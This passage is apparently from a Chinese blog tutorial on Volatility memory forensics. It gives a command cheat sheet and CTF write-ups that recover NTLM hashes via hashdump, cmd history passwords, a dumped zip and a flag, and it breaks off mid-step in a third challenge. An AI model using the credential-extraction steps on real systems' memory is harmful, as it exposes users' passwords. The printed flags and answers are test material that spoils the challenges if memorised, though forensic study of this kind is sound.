class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan | grep flag  <br></code></pre></td></tr></table></figure><h3 id="0x04-查看cmd上的操作"><a href="#0x04-查看cmd上的操作" class="headerlink" title="0x04 - 查看cmd上的操作"></a>0x04 - 查看cmd上的操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdscan<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdline <span class="hljs-comment">#列出命令行下运行的程序</span><br></code></pre></td></tr></table></figure><h3 id="0x05-查看具体恶意进程"><a href="#0x05-查看具体恶意进程" class="headerlink" title="0x05 - 查看具体恶意进程"></a>0x05 - 查看具体恶意进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree  | egrep <span class="hljs-string">&#x27;(a.exe|b.exe)&#x27;</span>   <span class="hljs-comment">#以树的形式来列出正在进行的进程</span><br></code></pre></td></tr></table></figure><h3 id="0x06-检查恶意链接"><a href="#0x06-检查恶意链接" class="headerlink" title="0x06 -  检查恶意链接"></a>0x06 -  检查恶意链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">检查链接插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] connections<br>检查端口插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] sockets<br></code></pre></td></tr></table></figure><h3 id="0x07-检测DLL"><a href="#0x07-检测DLL" class="headerlink" title="0x07 - 检测DLL"></a>0x07 - 检测DLL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] dlllist -p[pid]<br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] ldrmodules  -p[pid] -v <span class="hljs-comment">#显示包括隐藏dll的具体信息</span><br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] malfind -p[pid] <span class="hljs-comment">#找出注入的可执行代码或者DLL </span><br></code></pre></td></tr></table></figure><h3 id="0x08-根据PID导出程序"><a href="#0x08-根据PID导出程序" class="headerlink" title="0x08 - 根据PID导出程序"></a>0x08 - 根据PID导出程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] prodump -p [PID] -D [目录]<br></code></pre></td></tr></table></figure><h3 id="0x09-检查驱动程序"><a href="#0x09-检查驱动程序" class="headerlink" title="0x09 - 检查驱动程序"></a>0x09 - 检查驱动程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] modules<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] moddump -D [目录] --base [base地址]  <span class="hljs-comment">#提取驱动程序</span><br></code></pre></td></tr></table></figure><h3 id="0x10-查看开启的windows服务"><a href="#0x10-查看开启的windows服务" class="headerlink" title="0x10 - 查看开启的windows服务"></a>0x10 - 查看开启的windows服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] svcscan<br></code></pre></td></tr></table></figure><h3 id="0x10-查看注册表项"><a href="#0x10-查看注册表项" class="headerlink" title="0x10 - 查看注册表项"></a>0x10 - 查看注册表项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey<br></code></pre></td></tr></table></figure><h3 id="0x11-列出SAM表中的用户"><a href="#0x11-列出SAM表中的用户" class="headerlink" title="0x11 - 列出SAM表中的用户"></a>0x11 - 列出SAM表中的用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SAM\Domains\Account\Users\Names&quot;</span><br></code></pre></td></tr></table></figure><h3 id="0x12-获取最后登录系统的用户"><a href="#0x12-获取最后登录系统的用户" class="headerlink" title="0x12 - 获取最后登录系统的用户"></a>0x12 - 获取最后登录系统的用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure><h3 id="0x13-查看注册表信息"><a href="#0x13-查看注册表信息" class="headerlink" title="0x13 - 查看注册表信息"></a>0x13 - 查看注册表信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivelist<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivedump -o 0x93fc41e8(注册表的 virtual 地址)  <span class="hljs-comment">#导出注册表</span><br></code></pre></td></tr></table></figure><h3 id="0x14-获取浏览器浏览历史"><a href="#0x14-获取浏览器浏览历史" class="headerlink" title="0x14 - 获取浏览器浏览历史"></a>0x14 - 获取浏览器浏览历史</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] iehistory<br></code></pre></td></tr></table></figure><h3 id="0x15-查看时间线"><a href="#0x15-查看时间线" class="headerlink" title="0x15- 查看时间线"></a>0x15- 查看时间线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] timeliner<br></code></pre></td></tr></table></figure><h2 id="CTF中的内存取证题"><a href="#CTF中的内存取证题" class="headerlink" title="CTF中的内存取证题"></a>CTF中的内存取证题</h2><h3 id="湖湘杯2020-passwd"><a href="#湖湘杯2020-passwd" class="headerlink" title="[湖湘杯2020] passwd"></a>[湖湘杯2020] passwd</h3><p>查看内存镜像的基本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/volatility2.6]<br>└─<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</span><br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                                                                         <br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/WIN-BU6IJ7FI9RU-20190927-152050.raw)                        <br>                      PAE <span class="hljs-built_in">type</span> : PAE                                                                                                    <br>                           DTB : 0x185000L                                                                                              <br>                          KDBG : 0x83f61c28L                                                                                            <br>          Number of Processors : 2                                                                                                      <br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0x83f62c00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0x807ca000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2019-09-27 15:20:52 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2019-09-27 23:20:52 +0800                                                                                                                                       <br></code></pre></td></tr></table></figure><p>根据Suggested Profile(s)值，猜测是Win7SP1x86_23418的镜像</p><p>查看password的hash值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(root💀kali)-[/home/kali/volatility2<span class="hljs-number">.6</span>]<br>└─<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>CTF:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>a640404b5c386ab12092587fe19cd02:::<br></code></pre></td></tr></table></figure><p>对CTF用户的值，在线网站破解hash<br><img src="https://img-blog.csdnimg.cn/20210601130636808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="NEWSCTF2021-very-ez-dump"><a href="#NEWSCTF2021-very-ez-dump" class="headerlink" title="[NEWSCTF2021] very-ez-dump"></a>[NEWSCTF2021] very-ez-dump</h3><p>查看镜像信息，判断是Win7SP1x64镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw imageinfo                                                    <br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/mem.raw)<br>                      PAE <span class="hljs-built_in">type</span> : No PAE<br>                           DTB : 0x187000L<br>                          KDBG : 0xf8000403e0a0L<br>          Number of Processors : 2<br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xfffff8000403fd00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0xfffff880009ef000L<br>             KUSER_SHARED_DATA : 0xfffff78000000000L<br>           Image date and time : 2021-05-20 13:08:33 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2021-05-20 21:08:33 +0800<br></code></pre></td></tr></table></figure><p>列出进程，没看到什么有价值的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 pslist                                 <br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0xfffffa8000cb2040 System                    4      0     91      519 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80016bbb30 smss.exe                256      4      2       30 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80023c7b30 csrss.exe               348    328      9      437      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa80025c3060 wininit.exe             400    328      3       81      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa8001b6f060 csrss.exe               412    392     10      252      1      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa800262e7c0 winlogon.exe            464    392      5      121      1      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800260ab30 services.exe            484    400      9      206      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002674a90 lsass.exe               516    400     10      573      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800267f060 lsm.exe                 524    400     10      142      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002607b30 svchost.exe             640    484     11      359      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa80026af6a0 svchost.exe             720    484      9      292      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002735b30 svchost.exe             792    484     22      498      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa800275a060 svchost.exe             844    484     11      258      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002776960 svchost.exe             892    484     34      969      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027b5b30 svchost.exe            1000    484     17      698      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027dab30 svchost.exe             368    484     15      371      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002858b30 spoolsv.exe            1040    484     12      272      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800286bb30 svchost.exe            1072    484     18      331      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa8002938b30 VGAuthService.         1228    484      3       87      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800297ab30 taskhost.exe           1344    484      9      175      1      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa8002650b30 vmtoolsd.exe           1404    484     11      278      0      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa80029a9b30 dwm.exe                1648    844      5      149      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002a47b30 explorer.exe           1700   1596     44     1219      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002b0eb30 WmiPrvSE.exe           1920    640      9      217      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002af06c0 dllhost.exe            1996    484     13      197      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b93520 vm3dservice.ex          864   1700      2       41      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b3e060 vmtoolsd.exe           1296   1700      9      193      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8000d60060 msdtc.exe               520    484     12      146      0      0 2021-05-20 11:21:58 UTC+0000                                 <br>0xfffffa8002c42440 SearchIndexer.         2208    484     13      600      0      0 2021-05-20 11:22:01 UTC+0000                                 <br>0xfffffa8002d23880 wmpnetwk.exe           2360    484      9      214      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa8002da6b30 svchost.exe            2520    484     15      258      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa800142d400 sppsvc.exe             2500    484      4      150      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa8002d90060 svchost.exe            2408    484     13      343      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa800104ab30 audiodg.exe            2236    792      7      141      0      0 2021-05-20 11:33:37 UTC+0000                                 <br>0xfffffa80010c7060 cmd.exe                2624   1700      1       21      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8000d81550 conhost.exe            1588    412      2       62      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8001044710 SearchProtocol         2580   2208      8      285      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa80010db9b0 SearchFilterHo          316   2208      5       96      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa8001a29680 dllhost.exe            1888    640      6       87      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa8002c78060 dllhost.exe            1252    640      6       83      0      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa800142f060 DumpIt.exe             2864   1700      1       25      1      1 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e2060 conhost.exe            2824    412      2       61      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e6860 dllhost.exe            2696    640      6       69      1      0 2021-05-20 13:08:34 UTC+0000          <br></code></pre></td></tr></table></figure><p>看下password的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 hashdump<br>Volatility Foundation Volatility Framework 2.6<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1507e24d634a54c0b14750a7da2bdfdb:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::<br>mumuzi:1000:aad3b435b51404eeaad3b435b51404ee:0606ac59df4a10d3a9e1f97b3612546f:::                                                                                                                                                                      <br></code></pre></td></tr></table></figure><p>mumuzi用户的密码破解不出来，继续往下看</p><p>查看cmd下执行的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 cmdscan<br>Volatility Foundation Volatility Framework 2.6<br>**************************************************<br>CommandProcess: conhost.exe Pid: 1588<br>CommandHistory: 0x117120 Application: cmd.exe Flags: Allocated, Reset<br>CommandCount: 13 LastAdded: 12 LastDisplayed: 12<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#0 @ 0x109cf0: dir</span><br>Cmd <span class="hljs-comment">#1 @ 0x108290: ipconfig</span><br>Cmd <span class="hljs-comment">#2 @ 0xf8bd0: ipconfig 192.168.26.2</span><br>Cmd <span class="hljs-comment">#3 @ 0x116aa0: ping newsctf.top</span><br>Cmd <span class="hljs-comment">#4 @ 0x1082d0: network</span><br>Cmd <span class="hljs-comment">#5 @ 0x1082f0: net user</span><br>Cmd <span class="hljs-comment">#6 @ 0xf8c50: net user Guest 123456789</span><br>Cmd <span class="hljs-comment">#7 @ 0xf8c90: net user mumuzi (ljmmz)ovo</span><br>Cmd <span class="hljs-comment">#8 @ 0x108350: clear</span><br>Cmd <span class="hljs-comment">#9 @ 0x116a40: if_you_see_it,</span><br>Cmd <span class="hljs-comment">#10 @ 0xf8cd0: you_will_find_the_flag</span><br>Cmd <span class="hljs-comment">#11 @ 0x116ad0: where_is_the_flag?</span><br>Cmd <span class="hljs-comment">#12 @ 0x1178d0: net user Administrator flag_not_here</span><br>Cmd <span class="hljs-comment">#29 @ 0x90158: </span><br>Cmd <span class="hljs-comment">#30 @ 0x10f920: </span><br>**************************************************<br>CommandProcess: conhost.exe Pid: 2824<br>CommandHistory: 0x357140 Application: DumpIt.exe Flags: Allocated<br>CommandCount: 0 LastAdded: -1 LastDisplayed: -1<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#29 @ 0x2d0158: 5</span><br>Cmd <span class="hljs-comment">#30 @ 0x34f940: 4</span><br></code></pre></td></tr></table></figure><p>这条指令net user mumuzi (ljmmz)ovo  ，添加了一个用户mumuzi，密码是(ljmmz)ovo，继续往下看</p><p>查看文件，用grep命令查找含flag的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 filescan  | grep flag     <br>Volatility Foundation Volatility Framework 2.6<br>0x000000003e4b2070      2      0 -W-rwd \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br>0x000000003fa56dd0      2      0 RW-rw- \Device\HarddiskVolume1\Users\mumuzi\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk<br></code></pre></td></tr></table></figure><p>看到一个flag.zip，dump下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D news               <span class="hljs-comment">#-Q是偏移量，-D是存储的文件夹                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x3e4b2070   None   \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br></code></pre></td></tr></table></figure><p>带密码的压缩包，密码就是上面的(ljmmz)ovo，解压得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;ez_di_imp_1t_y0u_like?&#125;<br></code></pre></td></tr></table></figure><h3 id="福莱格殿下"><a href="#福莱格殿下" class="headerlink" title="福莱格殿下"></a>福莱格殿下</h3><p>参考：<a href="https://blog.csdn.net/weixin_43891422/article/details/107852416">https://blog.csdn.net/weixin_43891422/article/details/107852416</a></p><p>1.查看内存镜像信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw imageinfo<br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/zy.raw)<br>                      PAE <span class="hljs-built_in">type</span> : PAE<br>                           DTB : 0xaff000L<br>                          KDBG : 0x80546ae0L<br>          Number of Processors : 1<br>     Image Type (Service Pack) : 3<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xffdff000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2020-07-25 16:50:35 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2020-07-26 00:50:35 +0800<br></code></pre></td></tr></table></figure><p>镜像系统为WinXPSP2x86</p><p>2.获取进程信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86  pslist<br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0x821b9830 System                    4      0     58      254 ------      0                                                              <br>0x81c04ba0 smss.exe                536      4      3       19 ------      0 2020-07-25 15:35:26 UTC+0000                                 <br>0x81f59da0 csrss.exe               604    536     11      365      0      0 2020-07-25 15:35:29 UTC+0000                                 <br>0x82007d10 winlogon.exe            632    536     18      451      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x82085560 services.exe            716    632     16      269      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81c944a8 lsass.exe               728    632     22      355      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81f767f0 vmacthlp.exe            904    716      1       25      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x82054988 svchost.exe             916    716     15      189      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x81c1e2a0 svchost.exe             964    716     11      254      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81d57360 svchost.exe            1104    716     55     1147      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bc5458 svchost.exe            1152    716      4       77      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bcf650 svchost.exe            1192    716     14      198      0      0 2020-07-25 15:35:35 UTC+0000                                 <br>0x81d61650 explorer.exe           1596   1540     16      536      0      0 2020-07-25 15:35:39 UTC+0000                                 <br>0x82006da0 spoolsv.exe            1700    716     10      114      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81ffda48 rundll32.exe           1808   1596      4       78      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x8200a7e0 vmtoolsd.exe           1816   1596      7      246      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81d87c10 ctfmon.exe             1824   1596      1       71      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81feabb8 svchost.exe            1784    716      4       84      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81c96790 VGAuthService.e        1996    716      2       60      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81bf0c10 vmtoolsd.exe            176    716      7      267      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81fe0578 wmiprvse.exe           1040    916     13      237      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81c395a8 wscntfy.exe            1188   1104      1       39      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81bb3498 alg.exe                1552    716      5      102      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81d89da0 notepad.exe            1352   1596      2       92      0      0 2020-07-25 15:38:22 UTC+0000                                 <br>0x8206fda0 conime.exe             1832   1320      1       38      0      0 2020-07-25 15:49:44 UTC+0000                                 <br>0x81d89a08 DumpIt.exe              800   1596      1       25      0      0 2020-07-25 16:50:34 UTC+0000   <br></code></pre></td></tr></table></figure><p>可疑程序smss.exe</p><p>3.提取进程</p><figure class="highlight bash"><table><tr><td 